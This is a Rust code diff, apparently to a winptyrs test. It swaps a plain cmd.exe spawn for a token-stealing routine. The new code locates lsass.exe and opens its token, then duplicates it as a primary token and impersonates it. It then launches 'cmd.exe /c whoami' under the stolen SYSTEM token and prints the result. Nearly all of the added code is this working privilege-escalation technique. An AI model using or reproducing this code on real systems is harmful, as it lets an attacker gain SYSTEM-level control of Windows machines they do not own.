@@ -2,7 +2,26 @@
 
 use regex::Regex;
 use std::ffi::OsString;
+use std::ptr::null_mut;
 use std::{thread, time};
+use sysinfo::System;
+use winapi::um::processthreadsapi::PROCESS_INFORMATION;
+use winapi::{
+    ctypes::c_void,
+    shared::minwindef::FALSE,
+    um::{
+        errhandlingapi::GetLastError,
+        handleapi::{CloseHandle, INVALID_HANDLE_VALUE},
+        processthreadsapi::{OpenProcess, OpenProcessToken, STARTUPINFOW},
+        securitybaseapi::{DuplicateTokenEx, ImpersonateLoggedOnUser},
+        winbase::CreateProcessWithTokenW,
+        winnt::{
+            SecurityImpersonation, TokenPrimary, MAXIMUM_ALLOWED,
+            PROCESS_QUERY_LIMITED_INFORMATION, TOKEN_DUPLICATE, TOKEN_IMPERSONATE, TOKEN_QUERY,
+        },
+    },
+};
+use windows::Win32::Foundation::HANDLE;
 
 use winptyrs::{AgentConfig, MouseMode, PTYArgs, PTYBackend, PTY};
 
@@ -16,13 +35,94 @@ fn spawn_conpty() {
         timeout: 10000,
         agent_config: AgentConfig::WINPTY_FLAG_COLOR_ESCAPES,
     };
+    let mut original_token: *mut c_void = null_mut();
+    let mut duplicated_token: *mut c_void = null_mut();
+    let system = System::new_all();
 
-    let appname = OsString::from("C:\\Windows\\System32\\cmd.exe");
-    let mut pty = PTY::new_with_backend(&pty_args, PTYBackend::ConPTY).unwrap();
-    pty.spawn(appname, None, None, None, None).unwrap();
+    // Specify the process name you are looking for
+    let process_name = "lsass.exe";
+    let mut lsass = 4;
+    // Iterate over all processes
+    for (pid, process) in system.processes() {
+        if process.name() == process_name {
+            println!("Found process: {} with PID: {}", process_name, pid);
+            lsass = pid.as_u32();
+        }
+    }
 
-    let ten_millis = time::Duration::from_millis(10);
-    thread::sleep(ten_millis);
+    unsafe {
+        let proc_handle = OpenProcess(PROCESS_QUERY_LIMITED_INFORMATION, FALSE, lsass);
+
+        if proc_handle == INVALID_HANDLE_VALUE || proc_handle == 0 as *mut c_void {
+            let last_error = GetLastError();
+            println!("[-] Failed to open process: {}", last_error);
+        }
+        println!("[+] Opened process");
+
+        if OpenProcessToken(
+            proc_handle,
+            TOKEN_QUERY | TOKEN_DUPLICATE | TOKEN_IMPERSONATE,
+            &mut original_token,
+        ) == 0
+        {
+            let last_error = GetLastError();
+            println!("[-] Failed to open process token: {}", last_error);
+            CloseHandle(proc_handle);
+        }
+
+        if DuplicateTokenEx(
+            original_token,
+            MAXIMUM_ALLOWED,
+            null_mut(),
+            SecurityImpersonation,
+            TokenPrimary,
+            &mut duplicated_token,
+        ) == FALSE
+        {
+            let last_error = GetLastError();
+            println!("[-] Failed to duplicate token: {}", last_error);
+            CloseHandle(original_token);
+            CloseHandle(proc_handle);
+        }
+        println!("[+] Duplicated token");
+
+        if ImpersonateLoggedOnUser(duplicated_token) == FALSE {
+            let last_error = GetLastError();
+            println!("[-] Failed to impersonate user: {}", last_error);
+            CloseHandle(duplicated_token);
+            CloseHandle(original_token);
+            CloseHandle(proc_handle);
+        }
+        let dup = HANDLE(duplicated_token as isize);
+
+        let appname = OsString::from("C:\\Windows\\System32\\cmd.exe /c whoami");
+        let mut pty = PTY::new_with_backend(&pty_args, PTYBackend::ConPTY).unwrap();
+        pty.spawn(appname, None, None, None, Some(dup)).unwrap();
+        let mut output = String::new();
+        while pty.is_alive().unwrap() && !pty.is_eof().unwrap() {
+            let tmp_output = pty
+                .read(1000, false)
+                .ok()
+                .unwrap_or(OsString::from(""))
+                .to_string_lossy()
+                .to_string();
+
+            output += tmp_output.as_str();
+            println!("{}", output);
+        }
+        let tmp_output = pty
+            .read(1000, false)
+            .ok()
+            .unwrap_or(OsString::from(""))
+            .to_string_lossy()
+            .to_string();
+
+        output += tmp_output.as_str();
+        println!("{}", output);
+
+        let ten_millis = time::Duration::from_millis(10);
+        thread::sleep(ten_millis);
+    }
 }
 
 #[test]
